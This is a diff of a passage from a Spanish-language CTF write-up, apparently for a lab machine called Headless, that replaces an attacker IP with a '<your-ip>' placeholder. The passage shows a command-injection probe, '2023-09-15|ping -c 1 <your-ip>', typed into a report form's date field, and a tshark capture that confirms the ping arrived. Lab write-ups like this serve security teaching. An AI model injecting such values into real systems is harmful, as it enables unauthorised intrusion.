@@ -72,15 +72,15 @@ Colocándola en nuestro navegador (Abriendo las herramientas de desarrollador, y
 
 ![Dashboard](/assets/writeups/headless/3.png)
 
-Ahora tenemos una parte para generar reportes de la estabilidad del servidor, dándole al botón nos lo generará y podremos ver que simplemente nos dice que todo está correcto, pero si le metemos símbolos extraños ahora no dirá nada, probemos a ver si se ejecuta algún comando metiéndole una cadena al campo como `2023-09-15|ping -c 1 10.10.14.95`
+Ahora tenemos una parte para generar reportes de la estabilidad del servidor, dándole al botón nos lo generará y podremos ver que simplemente nos dice que todo está correcto, pero si le metemos símbolos extraños ahora no dirá nada, probemos a ver si se ejecuta algún comando metiéndole una cadena al campo como `2023-09-15|ping -c 1 <your-ip>`
 
 Al ejecutar nuestro sniffer de red en busca de pings ICMP por parte de la máquina, recibiremos un ping al intentar generar el reporte con el nuevo dato de arriba:
 
 ```bash
 ❯ tshark -i tun0 icmp
 Capturing on 'tun0'
-    1 0.000000000   10.10.11.8 → 10.10.14.95  ICMP 84 Echo (ping) request  id=0x17fc, seq=1/256, ttl=63
-    2 0.000074884  10.10.14.95 → 10.10.11.8   ICMP 84 Echo (ping) reply    id=0x17fc, seq=1/256, ttl=64 (request in 1)
+    1 0.000000000   10.10.11.8 → <your-ip>  ICMP 84 Echo (ping) request  id=0x17fc, seq=1/256, ttl=63
+    2 0.000074884  <your-ip> → 10.10.11.8   ICMP 84 Echo (ping) reply    id=0x17fc, seq=1/256, ttl=64 (request in 1)
 ```
 
 Es un indicio de una inyección de comandos.
